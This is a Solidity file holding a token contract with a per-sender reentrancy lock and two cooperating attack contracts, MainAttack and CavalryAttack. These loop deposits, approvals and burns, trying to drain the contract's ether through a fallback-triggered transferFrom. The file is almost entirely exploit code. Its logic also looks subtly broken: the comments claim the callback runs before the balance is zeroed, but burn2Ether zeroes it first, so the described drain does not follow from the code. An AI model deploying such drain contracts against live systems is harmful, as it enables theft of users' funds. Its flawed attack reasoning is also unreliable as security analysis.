contract TokenMint2Ether {
  mapping(address => uint256) balance;
  mapping(address => bool) lock;
  mapping(address => mapping(address => uint256)) allowance;

modifier checkLock { // reentrancy locking
  require(lock[msg.sender] == false); _; }

function deposit() external payable {
  balance[msg.sender] += msg.value;
}

function approve(address other, uint256 amnt) external { 
  allowance[msg.sender][other] += amnt; }

function transferFrom(address from, uint256 amnt) external checkLock {
  require(balance[from] >= amnt);
  require(allowance[from][msg.sender] >= amnt);
  balance[from] -= amnt;
  allowance[from][msg.sender] -= amnt;
  balance[msg.sender] += amnt; }

function burn2Ether() external checkLock {
  // set lock
  lock[msg.sender] = true;
  uint256 cache = balance[msg.sender];
  balance[msg.sender] = 0;
  msg.sender.call{value: cache}("");
  // release lock
  lock[msg.sender] = false;
   }
}

contract MainAttack {
    TokenMint2Ether public tokenMint;
    CavalryAttack public cavalry;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _tm) { tokenMint = TokenMint2Ether(_tm); }
    function setCav(address payable _c) external { cavalry = CavalryAttack(_c); }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        while (address(tokenMint).balance >= AMOUNT) {
        tokenMint.deposit{value: AMOUNT}();
        tokenMint.approve(address(cavalry), AMOUNT);   // let Cavalry pull Main's balance
        tokenMint.burn2Ether();
        cavalry.cashOut();  
      }
                      // lock[Main]=true; callback -> fallback
    }

    fallback() external payable {
        // runs mid-burn2Ether, before balance[Main] is zeroed
        cavalry.pull();                                // hand off to the UNLOCKED contract
    }

    function getBalance() public view returns (uint256) { return address(this).balance; }
}

contract CavalryAttack {
    TokenMint2Ether public tokenMint;
    MainAttack public main;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _tm) { tokenMint = TokenMint2Ether(_tm); }
    function setMain(address payable _m) external { main = MainAttack(_m); }

    function pull() external {
      // msg.sender = Cavalry (not locked); from = Main (balance still non-zero)
      tokenMint.transferFrom(address(main), AMOUNT);        
    }

    function cashOut() external {
      tokenMint.burn2Ether();
    }

    receive() external payable {}
    function getBalance() public view returns (uint256) { return address(this).balance; }
}